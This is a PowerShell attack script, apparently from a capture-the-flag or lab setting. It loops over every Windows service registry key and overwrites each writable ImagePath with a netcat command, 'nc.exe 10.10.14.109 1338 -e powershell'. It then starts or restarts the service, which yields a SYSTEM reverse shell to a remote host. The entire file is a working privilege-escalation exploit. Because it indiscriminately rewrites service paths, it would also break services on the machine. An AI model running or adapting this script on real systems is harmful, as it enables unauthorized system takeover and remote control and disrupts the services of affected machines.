
$services = get-childitem HKLM:\SYSTEM\CurrentControlset\Services | Select Name

foreach ($item in $services) {
    $entry = Get-ItemProperty "Registry::$($item.Name)" | Select ImagePath, Start, DisplayName |  Select ImagePath, Start, DisplayName 
    #if ($entry.Start -Match "3|4") {
        Try { 
            Set-Itemproperty -path "Registry::$($item.Name)" -Name Start -Value 2 -WhatIf -ErrorAction Stop
            $service_name = Get-Item "Registry::$($item.Name)" | Select pschildname | Format-Table -HideTableHeaders | Out-String
            $service = Get-Service $service_name.Trim() -ErrorAction SilentlyContinue
            Set-Itemproperty -path "Registry::$($item.Name)" -Name ImagePath -Value 'c:\temp\nc.exe 10.10.14.109 1338 -e powershell'
            #Get-ItemProperty "Registry::$($item.Name)" | Select ImagePath, Start, DisplayName |  Select ImagePath, Start, DisplayName | Format-List
            Try { 
                If ($service.Status -eq "Stopped") {
                    #Start-Service -Name $service.Name -WhatIf -ErrorAction Stop
                    #Write-Host "Seems you have full control on $($service.Name). Start mode is: $($entry.Start) "
                    # You can confirm that uncomment the bellow line 
                    #Get-Acl "Registry::$($item.Name)" | Format-List
                    #Write-Host $item.Name
                    #Write-Host $entry.ImagePath
                    #Write-Host "*$($entry.DisplayName)*"
                    #($entry | Format-List)
                    Write-Host "Trying to START $($service.Name) Status: $($service.Status ) Start mode is: $($service.StartType) "
                    Start-Service -Name $service.Name #-ErrorAction SilentlyContinue
                    Write-Host "Need to press enter to continue"
                    Start-Sleep
                } ElseIf ($service.Status -eq "Running") {
                    Write-Host "Trying to RE-START $($service.Name) Status: $($service.Status ) Start mode is: $($service.StartType) "
                    Restart-Service -Force -Name $service.Name #-ErrorAction SilentlyContinue
                    Write-Host "Need to press enter to continue"
                    Start-Sleep
                }
            } Catch { 
               Write-Host "Cannot start the service"
               Write-Host $_
            }
        } Catch { 
           Write-Host "An error occurred. Unable to change service"
           Write-Host $_
        }
 
    #}
}
